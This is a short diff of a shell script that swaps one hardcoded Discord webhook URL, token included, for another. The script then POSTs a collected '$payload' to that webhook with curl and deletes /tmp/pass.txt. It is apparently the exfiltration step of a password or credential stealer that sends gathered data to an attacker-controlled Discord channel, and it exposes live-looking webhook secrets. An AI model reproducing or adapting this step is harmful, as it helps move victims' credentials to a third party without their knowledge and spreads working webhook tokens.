@@ -133,7 +133,7 @@ else
     fi
     
     # --- Send Payload to Discord Webhook ---
-    DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
+    DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139736552570900/GsKXFNHTYx7Ej7D36VnzpotosTaIhxZk4Qb9SMySCM052SQ371xSdNH2Bu_oWexZkmxR"
     curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
     rm /tmp/pass.txt
     
